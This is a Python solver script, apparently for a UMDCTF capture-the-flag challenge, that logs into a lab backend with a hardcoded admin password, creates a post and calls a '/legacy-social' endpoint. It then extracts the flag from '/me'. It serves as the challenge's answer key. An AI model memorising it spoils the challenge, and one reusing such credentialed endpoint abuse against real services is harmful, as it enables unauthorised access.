#!/usr/bin/env python3
import json
import re
from http.cookiejar import CookieJar
from urllib import parse, request


BACKEND_URL = "http://a-minecraft-movie-backend:3000"
ADMIN_PASSWORD = "1ca937afd336064ffc5b6106d3a6d49a"


class Client:
    def __init__(self):
        self.opener = request.build_opener(
            request.HTTPCookieProcessor(CookieJar())
        )

    def post_json(self, path, body):
        data = json.dumps(body).encode()
        req = request.Request(
            BACKEND_URL + path,
            data=data,
            headers={"Content-Type": "application/json"},
        )
        with self.opener.open(req) as resp:
            return resp.read().decode()

    def post_form(self, path, body):
        data = parse.urlencode(body).encode()
        req = request.Request(
            BACKEND_URL + path,
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        with self.opener.open(req) as resp:
            return resp.read().decode()

    def get(self, path):
        with self.opener.open(BACKEND_URL + path) as resp:
            return resp.read().decode()


def main():
    client = Client()

    client.post_json(
        "/login",
        {"username": "admin", "password": ADMIN_PASSWORD},
    )

    post_id = client.post_json(
        "/create-post",
        {"title": "solver", "content": "<p>solver</p>"},
    ).strip().strip('"')

    client.post_form("/legacy-social", {"postId": post_id, "likes": "1"})
    me = client.get("/me")

    match = re.search(r"UMDCTF\{[^}]+\}", me)
    if not match:
        raise SystemExit("flag not found")

    print(match.group(0))


if __name__ == "__main__":
    main()
